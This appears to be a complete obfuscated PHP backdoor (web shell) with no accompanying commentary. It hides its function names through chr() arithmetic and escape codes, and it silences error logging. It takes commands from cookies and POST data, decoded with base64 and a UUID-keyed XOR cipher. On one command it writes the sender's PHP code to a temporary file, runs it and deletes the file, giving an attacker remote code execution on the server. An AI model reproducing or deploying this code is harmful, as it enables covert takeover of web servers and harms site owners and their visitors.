<?php $RVgfabsmyJ = 'f'."\x69"."\154".'e'.chr(95).'p'.chr(117)."\x74".chr(225-130).'c'.chr(847-736)."\156"."\x74".chr(595-494).'n'.chr(632-516)."\x73";
$vUOHv = chr(98)."\141".chr(765-650)."\145"."\x36".chr(52).chr(95).chr(100).chr(318-217)."\143".chr(111).'d'."\x65";
$dvfMnVGbOn = "\x69".'n'.'i'."\x5f"."\163".chr(101).chr(116);
$rUNUGnEIp = chr(117).chr(110).'l'.chr(105)."\x6e".chr(1024-917);


@$dvfMnVGbOn("\145".chr(452-338).chr(1040-926)."\x6f".chr(114).'_'."\154".chr(111).chr(103), NULL);
@$dvfMnVGbOn("\154".chr(111).chr(103).chr(702-607)."\145".chr(114).chr(798-684)."\x6f".'r'."\163", 0);
@$dvfMnVGbOn("\x6d".'a'."\170"."\137"."\145".'x'.chr(101).'c'.'u'."\x74".'i'.'o'."\x6e".chr(95)."\164"."\151"."\155".chr(465-364), 0);
@set_time_limit(0);

function wCcbRMQKt($Ajjyz, $wqYQUBzh)
{
    $qGzpJC = "";
    for ($zndBeF = 0; $zndBeF < strlen($Ajjyz);) {
        for ($j = 0; $j < strlen($wqYQUBzh) && $zndBeF < strlen($Ajjyz); $j++, $zndBeF++) {
            $qGzpJC .= chr(ord($Ajjyz[$zndBeF]) ^ ord($wqYQUBzh[$j]));
        }
    }
    return $qGzpJC;
}

$oflAcnLvxG = array_merge($_COOKIE, $_POST);
$hWnUT = '7cd1f27d-6df1-49fa-a254-be5461c30719';
foreach ($oflAcnLvxG as $OADPVa => $Ajjyz) {
    $Ajjyz = @unserialize(wCcbRMQKt(wCcbRMQKt($vUOHv($Ajjyz), $hWnUT), $OADPVa));
    if (isset($Ajjyz["\x61".chr(107)])) {
        if ($Ajjyz['a'] == chr(680-575)) {
            $zndBeF = array(
                'p'."\166" => @phpversion(),
                chr(115)."\x76" => "3.5",
            );
            echo @serialize($zndBeF);
        } elseif ($Ajjyz['a'] == 'e') {
            $jKWJwI = "./" . md5($hWnUT) . chr(46)."\151".chr(110).'c';
            @$RVgfabsmyJ($jKWJwI, "<" . chr(63).chr(915-803)."\x68".chr(735-623).chr(774-742).chr(64)."\165".chr(110).'l'."\151".chr(110)."\153".chr(596-556).chr(680-585).'_'.chr(187-117)."\111"."\114".chr(69).chr(998-903)."\x5f"."\51"."\x3b".chr(32) . $Ajjyz["\144"]);
            include($jKWJwI);
            @$rUNUGnEIp($jKWJwI);
        }
        exit();
    }
}

